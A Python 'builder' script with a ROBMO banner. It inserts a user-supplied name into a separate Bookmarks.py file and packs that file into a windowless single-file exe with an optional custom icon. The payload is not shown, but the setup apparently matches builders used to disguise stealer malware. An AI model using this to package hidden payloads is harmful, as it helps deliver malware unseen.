from pystyle import *
import os
import subprocess
from colorama import *
import time
from tkinter import filedialog, Tk

os.system('cls' if os.name == 'nt' else 'clear')

intro = """
██████╗  ██████╗ ██████╗ ███╗   ███╗ ██████╗ 
██╔══██╗██╔═══██╗██╔══██╗████╗ ████║██╔═══██╗
██████╔╝██║   ██║██████╔╝██╔████╔██║██║   ██║
██╔══██╗██║   ██║██╔══██╗██║╚██╔╝██║██║   ██║
██║  ██║╚██████╔╝██████╔╝██║ ╚═╝ ██║╚██████╔╝
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ 

                > Press Enter                                         
"""

Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)

print(f"""{Fore.LIGHTRED_EX}
      
██████╗  ██████╗ ██████╗ ███╗   ███╗ ██████╗ 
██╔══██╗██╔═══██╗██╔══██╗████╗ ████║██╔═══██╗
██████╔╝██║   ██║██████╔╝██╔████╔██║██║   ██║
██╔══██╗██║   ██║██╔══██╗██║╚██╔╝██║██║   ██║
██║  ██║╚██████╔╝██████╔╝██║ ╚═╝ ██║╚██████╔╝
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ 

            Welcome to builder

""")

time.sleep(1)

while True:
    Write.Print("\nWhich option do you want to choose: ", Colors.red_to_yellow)
    Write.Print("\n", Colors.red_to_yellow)
    Write.Print("\n1. Build Exe", Colors.red_to_yellow)
    Write.Print("\n2. Close", Colors.red_to_yellow)
    Write.Print("\n", Colors.red_to_yellow)
    Write.Print("\nMake your selection: ", Colors.red_to_yellow, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        exe_name = input(Fore.CYAN + "\nEnter the name for your executable: " + Style.RESET_ALL)
        
        os.system("cls || clear")
        filename = "Bookmarks.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"Username Here:"', f'"{exe_name}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.red_to_yellow)
        Write.Print(f"\n\n", Colors.red_to_yellow)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                answer = input(Fore.CYAN + "\nDo you want to add an icon? (Y/N) " + Style.RESET_ALL)
                if answer.upper() == "Y":
                    os.system("cls || clear")
                    Tk().withdraw()
                    icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
                    if icon_file:
                        subprocess.call(["pyinstaller", "--onefile", "--windowed", "--icon", icon_file, filename])
                        generated_exe = f"{exe_name}.exe"
                        os.rename("dist/Bookmarks.exe", f"dist/{generated_exe}")
                        os.system("cls || clear")
                        Write.Print(f"\n{filename} has been converted to {generated_exe} with the selected icon.", Colors.red_to_yellow)
                        os.system("cls || clear")
                    else:
                        Write.Print("\nThe file you choose must have .ico extension!", Colors.red_to_purple)
                else:
                    subprocess.call(["pyinstaller", "--onefile", "--windowed", filename])
                    generated_exe = f"{exe_name}.exe"
                    os.rename("dist/Bookmarks.exe", f"dist/{generated_exe}")
                    Write.Print(f"\n{filename} has been converted to {generated_exe}.", Colors.red_to_yellow)
                    os.system("cls || clear")
                    
                break

    elif choice == "2":
        Write.Print("\nExiting the program...\n\n", Colors.red_to_yellow)
        break  

    else:
        Write.Print("\nYou have entered an invalid option. Please try again.", Colors.red_to_purple)
